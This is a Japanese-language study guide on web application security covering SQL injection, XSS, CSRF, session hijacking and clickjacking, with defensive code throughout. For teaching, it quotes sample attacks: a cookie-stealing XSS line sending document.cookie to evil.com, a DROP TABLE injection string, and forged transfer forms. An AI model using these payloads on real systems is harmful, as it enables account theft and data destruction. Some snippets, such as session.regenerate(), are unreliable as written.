# Webセキュリティ

> Webアプリケーションの主要なセキュリティ脆弱性と対策

## 学習目標
- OWASP Top 10の主要脅威を理解する
- 各攻撃の仕組みと影響を説明できるようになる
- 適切な防御策を実装できるようになる
- セキュアコーディングの原則を習得する

---

## 1. SQLインジェクション

### 攻撃の仕組み

**定義**: SQL文に悪意あるコードを注入して、データベースを不正操作する攻撃

### 脆弱なコード例

```python
# 危険：ユーザー入力を直接SQLに埋め込み
def get_user(username):
    query = f"SELECT * FROM users WHERE username = '{username}'"
    return db.execute(query)

# 攻撃例
# username = "admin' OR '1'='1"
# 実行されるSQL: SELECT * FROM users WHERE username = 'admin' OR '1'='1'
# → すべてのユーザーが取得される
```

### より深刻な攻撃例

```python
# username = "'; DROP TABLE users; --"
# 実行されるSQL: SELECT * FROM users WHERE username = ''; DROP TABLE users; --'
# → usersテーブルが削除される
```

### 防御策

#### 1. プリペアドステートメント（最重要）

```python
# 安全：プレースホルダーを使用
def get_user_safe(username):
    query = "SELECT * FROM users WHERE username = ?"
    return db.execute(query, (username,))

# Python (psycopg2)
cursor.execute("SELECT * FROM users WHERE username = %s", (username,))

# Python (SQLAlchemy)
session.query(User).filter(User.username == username).first()
```

#### 2. ORMの使用

```python
# ORMは自動的にエスケープ処理
from sqlalchemy import select

user = session.query(User).filter_by(username=username).first()
```

#### 3. 入力検証

```python
import re

def validate_username(username):
    # 英数字とアンダースコアのみ許可
    if not re.match(r'^[a-zA-Z0-9_]{3,20}$', username):
        raise ValueError("Invalid username format")
    return username
```

#### 4. 最小権限の原則

```sql
-- アプリケーション用DBユーザーには最小限の権限のみ
GRANT SELECT, INSERT, UPDATE ON app_db.* TO 'app_user'@'localhost';
-- DROP, CREATEなどの権限は付与しない
```

### 検出方法

```python
# ログ監視
import logging

logger = logging.getLogger('sql_security')

def execute_query(query, params):
    logger.info(f"Executing query: {query} with params: {params}")
    # SQLインジェクションのパターンを検出
    suspicious_patterns = ["OR '1'='1", "DROP TABLE", "--", ";"]
    if any(pattern in str(params) for pattern in suspicious_patterns):
        logger.warning(f"Potential SQL injection attempt: {params}")
```

---

## 2. XSS（クロスサイトスクリプティング）

### 攻撃の種類

#### 2.1 反射型XSS（Reflected XSS）

**仕組み**: 攻撃コードがURLやフォームから直接反映される

```python
# 脆弱なコード
@app.route('/search')
def search():
    query = request.args.get('q')
    return f"<h1>Search results for: {query}</h1>"

# 攻撃URL
# /search?q=<script>alert('XSS')</script>
# → スクリプトが実行される
```

#### 2.2 格納型XSS（Stored XSS）

**仕組み**: 攻撃コードがDBに保存され、他のユーザーが閲覧時に実行

```python
# 脆弱なコード - コメント投稿
def save_comment(text):
    db.execute("INSERT INTO comments (text) VALUES (?)", (text,))

def display_comments():
    comments = db.execute("SELECT text FROM comments")
    html = ""
    for comment in comments:
        html += f"<p>{comment['text']}</p>"  # エスケープなし
    return html

# 攻撃者が投稿
# text = "<script>document.location='http://evil.com?cookie='+document.cookie</script>"
# → 他のユーザーのクッキーが盗まれる
```

#### 2.3 DOM Based XSS

**仕組み**: JavaScriptでDOMを操作する際の脆弱性

```javascript
// 脆弱なコード
const params = new URLSearchParams(window.location.search);
const username = params.get('username');
document.getElementById('welcome').innerHTML = `Welcome, ${username}!`;

// 攻撃URL
// ?username=<img src=x onerror="alert('XSS')">
```

### 防御策

#### 1. 出力エスケープ

```python
# Python (Flask)
from flask import render_template_string, Markup
from markupsafe import escape

@app.route('/search')
def search():
    query = request.args.get('q')
    # 自動エスケープ
    return render_template_string("<h1>Search: {{ query }}</h1>", query=query)

# 手動エスケープ
safe_query = escape(query)
```

```javascript
// JavaScript
function escapeHtml(text) {
    const map = {
        '&': '&amp;',
        '<': '&lt;',
        '>': '&gt;',
        '"': '&quot;',
        "'": '&#039;'
    };
    return text.replace(/[&<>"']/g, m => map[m]);
}

// 使用例
element.textContent = userInput;  // 安全（テキストとして扱う）
element.innerHTML = escapeHtml(userInput);  // エスケープ後のみ
```

#### 2. Content Security Policy (CSP)

```python
# HTTPヘッダーで設定
@app.after_request
def set_csp(response):
    response.headers['Content-Security-Policy'] = (
        "default-src 'self'; "
        "script-src 'self' https://trusted-cdn.com; "
        "style-src 'self' 'unsafe-inline'; "
        "img-src 'self' data:; "
    )
    return response
```

```html
<!-- HTMLのmetaタグでも設定可能 -->
<meta http-equiv="Content-Security-Policy"
      content="default-src 'self'; script-src 'self' https://trusted-cdn.com">
```

#### 3. HTTPOnly クッキー

```python
# Cookieを JavaScriptからアクセス不可に
from flask import make_response

@app.route('/login', methods=['POST'])
def login():
    response = make_response(redirect('/dashboard'))
    response.set_cookie('session_id', session_id,
                       httponly=True,  # JavaScript からアクセス不可
                       secure=True,    # HTTPS のみ
                       samesite='Strict')  # CSRF 対策
    return response
```

#### 4. 入力検証とサニタイゼーション

```python
import bleach

# HTMLタグを許可する場合
ALLOWED_TAGS = ['p', 'br', 'strong', 'em', 'a']
ALLOWED_ATTRIBUTES = {'a': ['href', 'title']}

def sanitize_html(text):
    return bleach.clean(text,
                       tags=ALLOWED_TAGS,
                       attributes=ALLOWED_ATTRIBUTES,
                       strip=True)

# 使用例
user_comment = "<p>Hello <script>alert('XSS')</script></p>"
safe_comment = sanitize_html(user_comment)
# → "<p>Hello </p>"
```

---

## 3. CSRF（クロスサイトリクエストフォージェリ）

### 攻撃の仕組み

**定義**: ログイン中のユーザーに、意図しない操作を実行させる攻撃

### 攻撃例

```html
<!-- 攻撃者のサイト evil.com -->
<img src="https://bank.com/transfer?to=attacker&amount=10000" />

<!-- ユーザーがbank.comにログイン中の場合、画像読み込みで送金が実行される -->
```

```html
<!-- より巧妙な攻撃 -->
<form action="https://bank.com/transfer" method="POST" id="csrf-form">
    <input type="hidden" name="to" value="attacker">
    <input type="hidden" name="amount" value="10000">
</form>
<script>
    document.getElementById('csrf-form').submit();
</script>
```

### 防御策

#### 1. CSRFトークン（最重要）

```python
# Flask with Flask-WTF
from flask_wtf import FlaskForm
from flask_wtf.csrf import CSRFProtect

app = Flask(__name__)
app.config['SECRET_KEY'] = 'your-secret-key'
csrf = CSRFProtect(app)

class TransferForm(FlaskForm):
    to = StringField('To')
    amount = IntegerField('Amount')

# テンプレート
# <form method="POST">
#     {{ form.csrf_token }}
#     {{ form.to }}
#     {{ form.amount }}
# </form>
```

```javascript
// JavaScript (フロントエンド)
// CSRFトークンをmetaタグから取得
const csrfToken = document.querySelector('meta[name="csrf-token"]').content;

fetch('/api/transfer', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json',
        'X-CSRF-Token': csrfToken
    },
    body: JSON.stringify({ to: 'user', amount: 100 })
});
```

#### 2. SameSite Cookie属性

```python
# Cookieの設定
response.set_cookie('session_id', session_id,
                   samesite='Strict',  # または 'Lax'
                   secure=True,
                   httponly=True)
```

**SameSite属性の種類**:
- `Strict`: クロスサイトリクエストでは送信されない（最も安全）
- `Lax`: トップレベルナビゲーション（リンククリック）では送信される
- `None`: すべてのリクエストで送信（`Secure`属性必須）

#### 3. カスタムヘッダーチェック

```python
@app.before_request
def check_custom_header():
    if request.method in ['POST', 'PUT', 'DELETE']:
        # AJAXリクエストには X-Requested-With ヘッダーが必須
        if request.headers.get('X-Requested-With') != 'XMLHttpRequest':
            abort(403)
```

#### 4. リファラーチェック

```python
from urllib.parse import urlparse

@app.before_request
def check_referer():
    if request.method == 'POST':
        referer = request.headers.get('Referer')
        if referer:
            referer_domain = urlparse(referer).netloc
            if referer_domain != request.host:
                abort(403, "Invalid referer")
```

---

## 4. セッションハイジャック

### 攻撃手法

#### 4.1 セッションID推測

```python
# 脆弱なコード - 予測可能なセッションID
import time
session_id = str(int(time.time()))  # 危険！
```

#### 4.2 セッション固定攻撃

攻撃者が特定のセッションIDをユーザーに使わせる

```python
# 脆弱なコード
@app.route('/login', methods=['POST'])
def login():
    # セッションIDを再生成していない
    session['user_id'] = authenticate(request.form['username'])
    return redirect('/dashboard')
```

### 防御策

#### 1. 安全なセッションID生成

```python
import secrets

# 暗号学的に安全な乱数生成
session_id = secrets.token_urlsafe(32)
```

#### 2. ログイン後のセッションID再生成

```python
from flask import session

@app.route('/login', methods=['POST'])
def login():
    user = authenticate(request.form['username'], request.form['password'])
    if user:
        # 古いセッションを破棄
        session.clear()
        # 新しいセッションIDで再生成
        session.regenerate()
        session['user_id'] = user.id
        return redirect('/dashboard')
```

#### 3. セッションタイムアウト

```python
from datetime import datetime, timedelta

class Session:
    def __init__(self):
        self.created_at = datetime.now()
        self.last_activity = datetime.now()

    def is_expired(self, timeout=timedelta(minutes=30)):
        return datetime.now() - self.last_activity > timeout

    def refresh(self):
        self.last_activity = datetime.now()

# ミドルウェア
@app.before_request
def check_session_timeout():
    if 'session_id' in session:
        user_session = get_session(session['session_id'])
        if user_session.is_expired():
            session.clear()
            return redirect('/login')
        user_session.refresh()
```

#### 4. IP アドレス・User Agent のバインディング

```python
@app.before_request
def validate_session():
    if 'session_id' in session:
        stored_ip = session.get('ip_address')
        stored_ua = session.get('user_agent')

        current_ip = request.remote_addr
        current_ua = request.headers.get('User-Agent')

        if stored_ip != current_ip or stored_ua != current_ua:
            session.clear()
            abort(401, "Session validation failed")
```

---

## 5. クリックジャッキング

### 攻撃の仕組み

**定義**: 透明なiframeで正規サイトを覆い、ユーザーのクリックを誘導

```html
<!-- 攻撃者のページ -->
<style>
    iframe {
        opacity: 0.0;
        position: absolute;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        z-index: 1000;
    }
    button {
        position: absolute;
        top: 100px;
        left: 200px;
    }
</style>

<button>Win $1000!</button>
<iframe src="https://bank.com/transfer?to=attacker&amount=10000"></iframe>

<!-- ユーザーは "Win $1000!" をクリックしたつもりが、
     実際には透明なiframe内の送金ボタンをクリック -->
```

### 防御策

#### 1. X-Frame-Options ヘッダー

```python
@app.after_request
def set_frame_options(response):
    response.headers['X-Frame-Options'] = 'DENY'
    # または
    # response.headers['X-Frame-Options'] = 'SAMEORIGIN'
    return response
```

**オプション**:
- `DENY`: すべてのフレーム埋め込みを拒否
- `SAMEORIGIN`: 同一オリジンのみ許可
- `ALLOW-FROM uri`: 特定のURIのみ許可（非推奨）

#### 2. Content-Security-Policy (CSP)

```python
@app.after_request
def set_csp(response):
    # frame-ancestors で埋め込み元を制限
    response.headers['Content-Security-Policy'] = "frame-ancestors 'self'"
    return response
```

#### 3. JavaScript によるフレーム検出

```javascript
// 自身がトップウィンドウでない場合、トップに移動
if (window.top !== window.self) {
    window.top.location = window.self.location;
}
```

---

## セキュアコーディング原則

### 1. 入力検証

```python
from typing import Any
import re

class InputValidator:
    @staticmethod
    def validate_email(email: str) -> bool:
        pattern = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
        return bool(re.match(pattern, email))

    @staticmethod
    def validate_integer(value: Any, min_val: int = None, max_val: int = None) -> int:
        try:
            num = int(value)
            if min_val is not None and num < min_val:
                raise ValueError(f"Value must be >= {min_val}")
            if max_val is not None and num > max_val:
                raise ValueError(f"Value must be <= {max_val}")
            return num
        except (ValueError, TypeError):
            raise ValueError("Invalid integer")

    @staticmethod
    def sanitize_filename(filename: str) -> str:
        # パストラバーサル攻撃を防ぐ
        filename = os.path.basename(filename)
        # 許可する文字のみ
        filename = re.sub(r'[^a-zA-Z0-9._-]', '', filename)
        return filename
```

### 2. 出力エンコーディング

```python
import html
import urllib.parse

class OutputEncoder:
    @staticmethod
    def html_encode(text: str) -> str:
        return html.escape(text)

    @staticmethod
    def url_encode(text: str) -> str:
        return urllib.parse.quote(text)

    @staticmethod
    def javascript_encode(text: str) -> str:
        # JavaScript文字列リテラル用
        escape_map = {
            '\\': '\\\\',
            '"': '\\"',
            "'": "\\'",
            '\n': '\\n',
            '\r': '\\r',
            '\t': '\\t'
        }
        return ''.join(escape_map.get(c, c) for c in text)
```

### 3. 安全なパスワード処理

```python
import bcrypt
import secrets

class PasswordManager:
    @staticmethod
    def hash_password(password: str) -> bytes:
        # bcrypt で安全にハッシュ化
        salt = bcrypt.gensalt(rounds=12)
        return bcrypt.hashpw(password.encode('utf-8'), salt)

    @staticmethod
    def verify_password(password: str, hashed: bytes) -> bool:
        return bcrypt.checkpw(password.encode('utf-8'), hashed)

    @staticmethod
    def generate_token() -> str:
        # パスワードリセットトークンなど
        return secrets.token_urlsafe(32)

    @staticmethod
    def validate_password_strength(password: str) -> tuple[bool, list[str]]:
        errors = []
        if len(password) < 8:
            errors.append("Password must be at least 8 characters")
        if not re.search(r'[A-Z]', password):
            errors.append("Password must contain uppercase letter")
        if not re.search(r'[a-z]', password):
            errors.append("Password must contain lowercase letter")
        if not re.search(r'\d', password):
            errors.append("Password must contain digit")
        if not re.search(r'[!@#$%^&*(),.?":{}|<>]', password):
            errors.append("Password must contain special character")

        return len(errors) == 0, errors
```

### 4. レート制限

```python
from datetime import datetime, timedelta
from collections import defaultdict

class RateLimiter:
    def __init__(self, max_requests: int, window_seconds: int):
        self.max_requests = max_requests
        self.window = timedelta(seconds=window_seconds)
        self.requests = defaultdict(list)

    def is_allowed(self, identifier: str) -> bool:
        now = datetime.now()
        # 古いリクエストを削除
        self.requests[identifier] = [
            req_time for req_time in self.requests[identifier]
            if now - req_time < self.window
        ]

        # リクエスト数チェック
        if len(self.requests[identifier]) >= self.max_requests:
            return False

        self.requests[identifier].append(now)
        return True

# 使用例
limiter = RateLimiter(max_requests=100, window_seconds=60)

@app.route('/api/data')
def get_data():
    identifier = request.remote_addr
    if not limiter.is_allowed(identifier):
        abort(429, "Too many requests")
    return jsonify({"data": "..."})
```

---

## セキュリティチェックリスト

### 開発時
- [ ] すべてのユーザー入力を検証
- [ ] SQL にはプリペアドステートメント使用
- [ ] 出力は常にエスケープ
- [ ] CSRF トークンを実装
- [ ] 安全なセッション管理
- [ ] パスワードは bcrypt でハッシュ化
- [ ] HTTPS を強制

### デプロイ時
- [ ] セキュリティヘッダー設定（CSP, X-Frame-Options等）
- [ ] エラーメッセージで内部情報を漏らさない
- [ ] ログに機密情報を記録しない
- [ ] 依存パッケージの脆弱性チェック
- [ ] レート制限の設定
- [ ] ファイアウォール設定
- [ ] 定期的なセキュリティ監査

---

## 学習ロードマップ

### Week 1: 基礎理解
- [ ] SQLインジェクション、XSS、CSRFの仕組みを理解
- [ ] 各攻撃の実例を確認
- [ ] 基本的な防御策を学習

### Week 2: 実装演習
- [ ] サンプルアプリで脆弱性を作成
- [ ] 各防御策を実装
- [ ] テストで脆弱性がないことを確認

### Week 3: セキュアコーディング
- [ ] 入力検証・出力エンコーディングの実装
- [ ] 安全なセッション管理
- [ ] セキュリティヘッダーの設定

### Week 4: 総合演習
- [ ] OWASP ZAPなどのツールでスキャン
- [ ] ペネトレーションテスト
- [ ] セキュリティレビュー実施

---

## 参考資料

### 公式ドキュメント
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/)
- [CWE (Common Weakness Enumeration)](https://cwe.mitre.org/)

### ツール
- OWASP ZAP - 脆弱性スキャナー
- Burp Suite - セキュリティテストツール
- Safety - Python パッケージの脆弱性チェック

### 学習サイト
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)
- [HackerOne Hacktivity](https://hackerone.com/hacktivity)
